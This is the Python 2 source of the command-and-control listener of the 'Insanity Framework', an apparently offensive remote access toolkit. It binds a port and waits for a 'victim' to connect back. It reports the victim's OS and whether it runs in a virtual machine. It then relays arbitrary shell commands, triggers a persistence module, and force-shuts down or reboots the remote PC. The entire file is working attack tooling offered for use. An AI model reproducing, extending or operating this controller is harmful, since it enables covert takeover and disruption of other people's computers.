#!/usr/bin/python
# -*- coding: iso-8859-15 -*-
# Copyright 2017 Insanity Framework (IF) 
# Written by: * Alisson Moretto - 4w4k3
# https://github.com/4w4k3/Insanity-Framework
# Licensed under the BSD-3-Clause
from socket import *
import os
import sys
from bin.settings import exec_com
from bin.settings import BLUE, RED, WHITE, GREEN, END

if not os.geteuid() == 0:
    sys.exit('Insanity must be run as root')
    
HOST = ''
PORT = int(raw_input('Tʏᴘᴇ ᴛʜᴇ ᴘᴏʀᴛ: '))


def clear():
    os.system('clear')


def heading():

    sys.stdout.write(RED + '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO': 
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :                  ʙʏ: ''' + WHITE + '''Alisson Moretto(''' + RED + '''4ᴡ4ᴋ3''' + WHITE + ''')''' + RED +  '''                                         
 -- [I]nsanity [F]ramework  --                            Version: 0.1                
''' + END)


def pp():
    sys.stdout.write(RED + '''
$u       #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$~
$#      `"$$$$$$$$$$$$$$$$$$$$$$$$$$|   [PROPANE         |$$$$$$$
$i        $$$$$$$$$$$$$$$$$$$$$$$$$$|         [NIGHTMARE |$$$$$$$$
$$        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$.        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$#
 $$      $iW$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!
 $$i      $$$$$$$#"" `"""#$$$$$$$$$$$$$$$$$#""""""#$$$$$$$$$$$$$$$W
 #$$W    `$$$#"            "       !$$$$$`           `"#$$$$$$$$$$#
  $$$     ``                 ! !iuW$$$$$                 #$$$$$$$#
  #$$    $u                  $   $$$$$$$                  $$$$$$$~
   "#    #$$i.               #   $$$$$$$.                 `$$$$$$
          $$$$$i.                """#$$$$i.               .$$$$#
          $$$$$$$$!         .   `    $$$$$$$$$i           $$$$$
          `$$$$$  $iWW   .uW`        #$$$$$$$$$W.       .$$$$$$#
            "#$$$$$$$$$$$$#`          $$$$$$$$$$$iWiuuuW$$$$$$$$W
               !#""    ""             `$$$$$$$##$$$$$$$$$$$$$$$$
          i$$$$    .                   !$$$$$$ .$$$$$$$$$$$$$$$#
         $$$$$$$$$$`                    $$$$$$$$$Wi$$$$$$#"#$$`
         #$$$$$$$$$W.                   $$$$$$$$$$$#   ``
          `$$$$##$$$$!       i$u.  $. .i$$$$$$$$$#""''' + WHITE + '''   InSaNiTy FrAmEwOrK''' + RED + '''
             "     `#W       $$$$$$$$$$$$$$$$$$$`      u$#
                            W$$$$$$$$$$$$$$$$$$      $$$$W
                            $$`!$$$##$$$$``$$$$      $$$$!
                           i$" $$$$  $$#"`  """     W$$$$
''' + END)

clear()
heading()


def mess():
    print '[*] O.S.: ' + data2
    if vm == 'True':
        print '[*] Virtual Machine: {0}Detected{1}'.format(RED, END) 
    else:
        print '[*] Virtual Machine: Not Detected'
    print '-{0} Type a remote shell command{1} - {0}[{1}ex: ipconfig{0}]{1}: '.format(BLUE, END)
    print '- {0}Run insanity modules{1} - {0}[{1}view available modules on help message{0}]{1}: '.format(BLUE, END)
    print '-{0} ʜᴇʟᴘ {1}- {0}[{1}View help message and modules{0}]{1}: '.format(BLUE, END)

s = socket(AF_INET, SOCK_STREAM)
print '[!] Wainting Connections '
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((HOST, PORT))
print "[*] Listening on: 0.0.0.0:%s" % str(PORT)
s.listen(10)
conn, addr = s.accept()
print '[*] Connection: ' + '{0}ESTABLISHED{2}'.format(GREEN, WHITE, END)
data = conn.recv(1024) 
ip = conn.recv(1024)
conn.send('whoami')
data2 = conn.recv(1024)
vm = conn.recv(1024)
#oss = conn.recv(1024)

mess()


def help():
    print '''
- [I]nsanity [F]ramework -
    
ᴛʏᴘᴇ {0}info{1} - {0}[{1}show info about victim{0}]{1}
ᴛʏᴘᴇ {0}persistence{1} - {0}[{1}enable persistence{0}]{1}
ᴛʏᴘᴇ {0}shutdown{1} - {0}[{1}turn off remote pc{0}]{1}
ᴛʏᴘᴇ {0}restart{1} - {0}[{1}reboot remote pc{0}]{1}
ᴛʏᴘᴇ {0}back{1} - {0}[{1}return to main menu{0}]{1}
ᴛʏᴘᴇ {0}quit{1} - {0}[{1}tool exit{0}]{1}
'''.format(BLUE, END)


# start loop
def main():
    try:
        while 1:
     # enter shell command
            header = ('{0}InSaNiTy{1} > {2}'.format(RED, WHITE, END))
            command = raw_input(header)
            if command.upper() == 'QUIT': 
                clear()
                pp()
                conn.close()
            elif command.upper() == 'HELP':
                help()
            elif command.upper() == 'INFO':
                mess()
            elif command.upper() == 'BACK':
                exec_com('insanity.py')
            elif command.upper() == 'PERSISTENCE':
                try:
                    conn.send('persistence')
                    print '[*] Persistence module enabled'
                except:
                    print '\n'
                    print '{0}Remote host are disconnected{1} '.format(RED, END)
                    print '\n' + 'ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}'.format(BLUE, END)
                    print 'ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}'.format(BLUE, END)
            elif command.upper() == 'SHUTDOWN':
                try:
                    conn.send('shutdown -s -t 00 -f')
                except:
                    print '\n'
                    print '{0}ʀᴇᴍᴏᴛᴇ ʜᴏsᴛ ʜᴀs ʙᴇᴇɴ ᴅɪsᴄᴏɴɴᴇᴄᴛᴇᴅ{1} '.format(RED, END)
                    print '\n' + 'ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}'.format(BLUE, END)
                    print 'ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}'.format(BLUE, END)    
            elif command.upper() == 'RESTART':
                try:
                    conn.send('shutdown -r -t 00 -f')
                except:
                    print '\n'
                    print '{0}ʀᴇᴍᴏᴛᴇ ʜᴏsᴛ ʜᴀs ʙᴇᴇɴ ᴅɪsᴄᴏɴɴᴇᴄᴛᴇᴅ{1} '.format(RED, END)
                    print '\n' + 'ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}'.format(BLUE, END)
                    print 'ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}'.format(BLUE, END)    
            else:
                try:
                    if command != '':
                        data = ''
                        conn.send(command)
                        try:
                            s.settimeout(5.0)
                            conn.settimeout(5.0)     
                            data = conn.recv(4096)
                            print data
                            s.settimeout(None)
                            conn.settimeout(None) 
                        except:
                            print '[*] ᴄᴏᴍᴍᴀɴᴅ ᴇxᴇᴄᴜᴛᴇᴅ'
                except:
                    print '\n'
                    print '{0}ʀᴇᴍᴏᴛᴇ ʜᴏsᴛ ʜᴀs ʙᴇᴇɴ ᴅɪsᴄᴏɴɴᴇᴄᴛᴇᴅ{1} '.format(RED, END)
                    print '\n' + 'ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}'.format(BLUE, END)
                    print 'ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}'.format(BLUE, END)
    except KeyboardInterrupt:
        clear()
        pp()
        conn.close()


if __name__ == '__main__':
    main()
